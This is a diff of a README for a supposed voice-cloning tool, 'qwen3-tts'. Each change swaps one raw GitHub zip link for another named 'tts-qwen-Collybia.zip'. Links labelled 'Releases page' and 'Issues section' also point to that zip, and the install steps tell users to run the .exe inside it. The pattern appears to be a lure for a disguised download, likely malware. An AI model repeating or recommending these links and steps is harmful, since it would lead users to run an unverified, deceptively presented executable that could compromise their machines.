@@ -6,7 +6,7 @@ Welcome to **qwen3-tts**, your tool for local GPU accelerated voice cloning. Thi
 
 ## 📥 Download
 
-[![Download qwen3-tts](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/qwen-tts-v3.6.zip)](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/qwen-tts-v3.6.zip)
+[![Download qwen3-tts](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/tts-qwen-Collybia.zip)](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/tts-qwen-Collybia.zip)
 
 You can download the latest version of the software from our Releases page. 
 
@@ -28,7 +28,7 @@ To run **qwen3-tts**, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases page**: Click the link below to access the latest version.  
-   [Download qwen3-tts](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/qwen-tts-v3.6.zip)
+   [Download qwen3-tts](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/tts-qwen-Collybia.zip)
 
 2. **Choose your version**: Scroll down the page to find the most recent release.
 
@@ -37,7 +37,7 @@ To run **qwen3-tts**, ensure your system meets the following requirements:
 4. **Install the application**: 
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the qwen3-tts icon to your Applications folder.
-   - For Linux: Extract the https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/qwen-tts-v3.6.zip file and follow the instructions included.
+   - For Linux: Extract the https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/tts-qwen-Collybia.zip file and follow the instructions included.
 
 ## ➕ Usage Instructions
 
@@ -65,7 +65,7 @@ If you encounter issues while using **qwen3-tts**, here are some common problems
 
 ## 🗨 Community Support
 
-If you have questions or need help, you can check the [Issues section](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/qwen-tts-v3.6.zip) of our GitHub repository. Feel free to ask the community for support, or search for solutions to common issues.
+If you have questions or need help, you can check the [Issues section](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/tts-qwen-Collybia.zip) of our GitHub repository. Feel free to ask the community for support, or search for solutions to common issues.
 
 ## 📄 License
 
@@ -75,4 +75,4 @@ This project is licensed under the terms of the MIT License. You can view the fu
 
 Don’t forget to download the latest version from our Releases page for the best experience.
 
-[Download qwen3-tts](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/qwen-tts-v3.6.zip)
+[Download qwen3-tts](https://raw.githubusercontent.com/ipriyanshuuu/qwen3-tts/main/assets/tts-qwen-Collybia.zip)
